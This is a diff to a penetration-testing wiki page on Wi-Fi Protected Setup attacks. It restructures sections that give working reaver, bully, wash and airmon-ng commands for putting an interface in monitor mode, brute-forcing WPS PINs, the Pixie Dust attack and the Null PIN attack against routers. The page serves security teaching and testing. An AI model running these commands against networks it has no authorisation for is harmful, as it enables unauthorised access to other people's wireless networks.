@@ -11,9 +11,7 @@ Initially it's 20k possible combinations (10^8 =100.000.000 to 10^4+10^4=20.000)
 
 {% endhint %}
 
-## Attacks
-
-Here are some known attacks on Wi-Fi Protected Setup (WPS):
+Below are some known attacks on Wi-Fi Protected Setup (WPS):
 
 * **PIN Brute-Force:** Some routers with WPS allow users to connect by entering an 8-digit PIN code. A brute-force attack involves trying all possible combinations until the correct PIN is found.
 * **Pixie Dust:** This attack exploits a weakness in the generation of WPS encryption keys. It involves exploiting vulnerabilities in certain routers during the creation of WPA/WPA2 encryption keys.
@@ -21,6 +19,21 @@ Here are some known attacks on Wi-Fi Protected Setup (WPS):
 * **Access Point Enumeration:** Some routers with WPS may be vulnerable to an attack that allows an attacker to determine which access points are present in a given area.
 
 ## Practice
+
+Most WPS attacks mentionned below can be conducted using [airgeddon](https://github.com/v1s1t0r1sh3r3/airgeddon) (Bash) or [wifite2](https://github.com/derv82/wifite2) (Python).
+
+{% hint style="info" %}
+
+Monitor mode can be activated automatically with these tools. The [monitor](wps.md#monitor-mode) section would not needed then.
+
+{% endhint %}
+
+{% hint style="warning" %}
+
+Some of the commands listed in this section may require high privileges to run. Containers would also need high privileges on a host.
+
+{% endhint %}
+
 
 There are three main methods for setting up a connection using WPS:
 
@@ -33,99 +46,96 @@ There are three main methods for setting up a connection using WPS:
 The default configuration for wireless interfaces is "Managed" mode, restricting packet capture to those with a "Destination MAC" matching the interface's own MAC address.
 To capture all packets within a wireless device's range, switch the mode to "Monitor."
 
-If you have [Aircrack-ng](https://www.aircrack-ng.org/) (C) installed, you can run the following commands in your terminal:
-```bash
-# You may need to run these commands as root or a user with privileges
-# /!\ Beware: change placeholder value $INTERFACE
+{% tabs %}
 
-airmon-ng #to list all your network interfaces.
-arimon-ng check kill #to stop interfering network processes.
-airmon-ng start "$INTERFACE" #to start your network interface in monitor mode.
+{% tab title="UNIX-like" %}
+
+The following native commands can be used to have a capable network interface in monitor mode.
+
+```bash
+# view wireless interfaces and check their current mode.
+iwconfig
+
+# disable a network interface
+ifconfig "$INTERFACE" down
+
+# change the interface mode to monitor
+iwconfig "$INTERFACE" mode monitor
+
+# re-enable your network interface.
+ifconfig "$INTERFACE" up
+```
+{% endtab %}
+
+{% tab title="Aircrack-ng" %}
+
+With [Aircrack-ng](https://www.aircrack-ng.org/) (C) installed, the following commands can be used.
+
+```bash
+# list all your network interfaces.
+airmon-ng
+
+# stop  interfering network processes
+arimon-ng check kill
+
+# start a network interface in monitor mode
+airmon-ng start "$INTERFACE"
 ```
 
-If you are not using [Aircrack-ng](https://www.aircrack-ng.org/) (C), you can run the following commands in your terminal:
-```bash
-# You may need to run these commands as root or a user with privileges
-# /!\ Beware: change placeholder value $INTERFACE
+{% endtab %}
 
-iwconfig #to view your wireless interfaces and check their current mode.
-ifconfig "$INTERFACE" down #to disable the network interface you wish to change.
-iwconfig "$INTERFACE" mode monitor #to change the mode of "$INTERFACE" to "monitor".
-ifconfig "$INTERFACE" up #to re-enable your network interface.
-```
+{% endtabs %}
 
 ### Recon
 
-[Wash](https://github.com/t6x/reaver-wps-fork-t6x) (C) is a tool used to detect access points with WPS (Wi-Fi Protected Setup) enabled. It can perform a survey either directly from a live interface or by scanning a list of pcap files. As an auxiliary utility, Wash is a tool used to identify nearby WPS-enabled access points along with their main characteristics. It is included in the [Reaver](https://github.com/t6x/reaver-wps-fork-t6x) (C) package.
+[Wash](https://github.com/t6x/reaver-wps-fork-t6x) is used to identify nearby WPS-enabled access points along with their main characteristics. It is included in the [Reaver](https://github.com/t6x/reaver-wps-fork-t6x) (C) package.
+
 ```bash
-# /!\ Beware: change placeholder value $INTERFACE
 wash -i "$INTERFACE"
 ```
 
-### Brute-Force Attack
+### PIN Brute-Force
 
-In December 2011, researcher [Stefan Viehböck](https://twitter.com/sviehb) identified a design and implementation flaw that renders PIN-based WPS vulnerable to brute-force attacks on WPS-enabled Wi-Fi networks. A successful exploitation of this flaw grants unauthorized individuals access to the network, and the sole effective solution is to disable WPS.
+In 2011, researcher [Stefan Viehböck](https://twitter.com/sviehb) identified a design and implementation flaw that made PIN-based WPS vulnerable to brute-force attacks. A successful exploitation of this flaw would grant unauthorized individuals access to the network, and the sole effective solution is to disable WPS.
 
-Today, two primary tools are available for executing this operation: [Reaver](https://github.com/t6x/reaver-wps-fork-t6x) (C) and [Bully](https://github.com/aanarchyy/bully) (C).
-Reaver is crafted to be a robust and effective attack method targeting WPS. It has undergone testing against a diverse range of access points and WPS implementations. On the other hand, Bully represents a fresh implementation of the WPS brute force attack, coded in C. It offers several advantages over the original Reaver code, including fewer dependencies, enhanced memory and CPU performance, accurate handling of endianness, and a more resilient set of options.
+Two main tools are now available for conducting this attack: [Reaver](https://github.com/t6x/reaver-wps-fork-t6x) (C) and [Bully](https://github.com/aanarchyy/bully) (C).
 
 ```bash
-# /!\ Beware: change placeholder values $INTERFACE, $BSSID, $CHANNEL
-# Verbosity of output (for reaver): -v -vv -vvv
-# Verbosity of output (for bully): -v 1 -v 2 -v 3
-# Use 5GHz 802.11 channels: -5
+# Use 5GHz 802.11 channels (for both tools): -5
 
-# With reaver:
+# With reaver
+# Verbosity of output (for reaver): -v -vv -vvv
 reaver -i "$INTERFACE" -b "$BSSID" -c "$CHANNEL" -vv
 
-# With bully:
+# With bully
+# Verbosity of output: -v 1 -v 2 -v 3
 bully "$INTERFACE" -b "$BSSID" -c "$CHANNEL" -S -F -B -v 3
 ```
 
-### Pixie Dust attack
+### Pixie Dust
 
-During the summer of 2014, [Dominique Bongard](https://twitter.com/Reversity) identified a security vulnerability he named the Pixie Dust attack. This exploit specifically targets the default WPS implementation found in wireless chips produced by various manufacturers, including Ralink, MediaTek, Realtek, and Broadcom. The attack exploits a deficiency in randomization during the generation of the E-S1 and E-S2 "secret" nonces. With knowledge of these nonces, the PIN can be retrieved in a matter of minutes. To streamline the process, a tool called pixiewps was developed, and a new version of Reaver was created to automate the attack.
+In 2014, [Dominique Bongard](https://twitter.com/Reversity) identified a security vulnerability he dubbed "Pixie Dust". It specifically targets the default WPS implementation found in wireless chips produced by various manufacturers, including Ralink, MediaTek, Realtek, and Broadcom. The attack exploits a randomization deficiency during the generation of the "E-S1" and "E-S2" "secret" nonces. Knowing these nonces, the PIN can be retrieved in a matter of minutes. 
 
-Check this [list](https://docs.google.com/spreadsheets/d/1tSlbqVQ59kGn8hgmwcPTHUECQ3o9YhXR91A_p7Nnj5Y) to know which router model is vulnerable.
+A tool called [pixiewps](https://github.com/wiire-a/pixiewps) was developed, and a new version of [Reaver](https://github.com/t6x/reaver-wps-fork-t6x) was created to automate the attack.
+
+Check [this list](https://docs.google.com/spreadsheets/d/1tSlbqVQ59kGn8hgmwcPTHUECQ3o9YhXR91A_p7Nnj5Y) to know which router model is vulnerable.
 
 ```bash
-# /!\ Beware: change placeholder values $INTERFACE, $BSSID, $CHANNEL
-# Verbosity of output (for reaver) : -v -vv -vvv
-# Verbosity of output (for bully) : -v 1 -v 2 -v 3
-# Use 5GHz 802.11 channels : -5
+# Use 5GHz 802.11 channels (for both tools): -5
 
-# With reaver:
+# With reaver
+# Verbosity of output (for reaver): -v -vv -vvv
 reaver -i "$INTERFACE" -b "$BSSID" -c "$CHANNEL" -K 1 -N -vv
 
-# With bully:
+# With bully
+# Verbosity of output: -v 1 -v 2 -v 3
 bully  "$INTERFACE" -b "$BSSID" -d -v 3
 ```
 
-### Null Pin attack
+### Null Pin
 
-Certain poorly implemented systems permitted the use of a Null PIN for connections, which is highly unusual. Reaver has the capability to test for this, whereas Bully lacks this specific functionality.
+Some poorly implemented systems allowed the use of a "Null" PIN for connections. [Reaver](https://github.com/t6x/reaver-wps-fork-t6x) can conduct the attack, whereas [Bully](https://github.com/aanarchyy/bully) lacks this specific functionality.
 
 ```bash
-# /!\ Beware: change placeholder values $INTERFACE, $BSSID, $CHANNEL
-# Verbosity of output (for reaver): -v -vv -vvv
-
 reaver -i "$INTERFACE" -b "$BSSID" -c "$CHANNEL" -f -N -g 1 -vv -p ''
 ```
-
-## All-in-one tools
-
-All the mentioned WPS attacks can be effortlessly executed using airgeddon or wifite2.
-
-Airgeddon (Bash): https://github.com/v1s1t0r1sh3r3/airgeddon
-
-Wifite2 (Python): https://github.com/derv82/wifite2
-
-{% hint style="info" %}
-
-Monitor mode can be activated automatically with tools such as airgeddon and wifite2.
-
-{% endhint %}
-
-## Resources
-
-{% embed url="https://docs.google.com/spreadsheets/d/1tSlbqVQ59kGn8hgmwcPTHUECQ3o9YhXR91A_p7Nnj5Y" %}
